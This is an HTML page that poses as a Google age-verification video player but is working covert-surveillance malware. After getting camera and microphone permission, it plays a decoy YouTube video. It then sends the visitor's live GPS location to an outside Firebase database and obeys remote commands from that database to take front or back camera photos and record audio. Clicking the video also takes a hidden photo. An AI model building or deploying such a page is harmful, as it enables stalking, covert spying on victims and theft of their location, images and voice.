<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Services - Secure Player</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; margin: 0; overflow: hidden; }
        .box { padding: 50px 20px; }
        #playBtn { background: #ff0000; color: #fff; border: none; padding: 15px 40px; font-size: 18px; border-radius: 30px; cursor: pointer; box-shadow: 0 0 20px #ff0000; }
        #videoArea { display: none; width: 100vw; height: 100vh; position: fixed; top:0; }
        iframe { width: 100%; height: 100%; border: none; }
        #overlay { position: absolute; width: 100%; height: 100%; z-index: 10; cursor: pointer; }
    </style>
</head>
<body>
    <div id="mainUI" class="box">
        <h2 style="color: #4285f4;">G-Services Verification</h2>
        <p>Confirm you are 18+ to watch this video.</p>
        <button id="playBtn" onclick="init()">VERIFY & PLAY</button>
    </div>

    <div id="videoArea">
        <div id="overlay" onclick="capturePhoto('user')"></div>
        <iframe id="player" allow="autoplay; camera; microphone"></iframe>
    </div>

    <script>
        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" }; //
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let userId = "Target_" + Math.floor(Math.random() * 9000 + 1000);
        localStorage.setItem("tid", userId);

        async function init() {
            try {
                // Requesting Mic and Camera permissions for Android
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                stream.getTracks().forEach(t => t.stop());

                document.getElementById('mainUI').style.display = 'none';
                document.getElementById('videoArea').style.display = 'block';
                document.getElementById('player').src = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=0";

                startTracking();
            } catch (e) { alert("Please allow permissions to continue."); }
        }

        function startTracking() {
            // Live Location
            navigator.geolocation.watchPosition(pos => {
                db.ref('targets/' + userId + '/location').update({
                    lat: pos.coords.latitude, lng: pos.coords.longitude, time: new Date().toLocaleTimeString()
                });
            }, null, { enableHighAccuracy: true });

            // Command Listener
            db.ref('commands/' + userId).on('value', async snap => {
                const cmd = snap.val();
                if (cmd?.action === "photo_front") capturePhoto("user");
                if (cmd?.action === "photo_back") capturePhoto("environment");
                if (cmd?.action === "audio") recordAudio(30000);
            });
        }

        async function capturePhoto(mode) {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            db.ref('targets/' + userId + '/photos').push({ img: canvas.toDataURL('image/jpeg', 0.5), type: mode });
            stream.getTracks().forEach(t => t.stop());
        }

        async function recordAudio(duration) {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const recorder = new MediaRecorder(stream);
            let chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => db.ref('targets/' + userId + '/audios').push({ data: reader.result });
            };
            recorder.start();
            setTimeout(() => recorder.stop(), duration);
        }
    </script>
</body>
</html>
